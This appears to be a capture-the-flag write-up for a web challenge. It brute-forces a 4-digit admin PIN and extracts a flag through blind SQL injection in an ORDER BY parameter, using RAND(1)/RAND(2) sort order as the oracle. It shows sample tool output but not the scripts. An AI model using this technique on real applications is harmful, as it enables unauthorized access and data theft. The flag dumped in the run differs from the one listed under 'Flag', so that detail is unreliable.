# secureform-admin

## Description

You've discovered the admin panel of a contact form application called SecureForm. Access is protected by a 4-digit PIN... but is it really secure?

Once inside, the dashboard lists form submissions and offers sorting options. The developer tried to mimic WordPress sanitization, but something slipped through.

## Solution Walkthrough

First, I used `solution.js` to brute-force the PIN and found out that the PIN is 7392.

```text
Tried 7200/10000 | last 7358
[+] PIN: 7392
```

After entering `/dashboard`, we can see the entries and adjust the sorting method. The description mentioned that the developer attempted to mimic WordPress sanitization but messed up some parts, so I guessed that we can inject SQL statements into the `orderby` parameter.

Since the page does not display the query results directly, we can only perform blind SQL injection by observing the sorting order of the entries. I started by adding two entries, `aaaaa` and `zzzzz`, and then tested the sorting difference between `RAND(1)` and `RAND(2)`. When the condition evaluates to true, the sorting matches the result of `RAND(1)`; otherwise, it matches `RAND(2)`.

```text
[+] true sig : ('aaaaa', 'zzzzz')
[+] false sig: ('zzzzz', 'aaaaa')
```

After confirming this behavior, I began the blind injection. First, I needed to retrieve all the tables, which revealed two tables: `entries` and `secrets`. Next, I extracted the column names for the `secrets` table, which turned out to be `id` and `flag`. Once that was set, I could start dumping the flag via blind injection.

```text
> python .\solution.py --url https://dalctf-secureform-admin-183-64616c.instancer.dalctf2026.com/dashboard.php --pin 7392
[+] login: 200
[+] add: aaaaa 200
[+] add: zzzzz 200
[+] marker A: aaaaa
[+] marker Z: zzzzz
[+] true sig : ('aaaaa', 'zzzzz')
[+] false sig: ('zzzzz', 'aaaaa')
ctf_challenge
[+] database: ctf_challenge
entries,secrets
[+] tables: entries,secrets
id,flag
[+] secrets: id,flag
dalctf{bl1nd_sqli_0rd3r_by}
[+] flag: dalctf{bl1nd_sqli_0rd3r_by}
```

## Flag

```text
dalctf2026{open-ticket-send-me-ur-fav-song-in-album6}
```
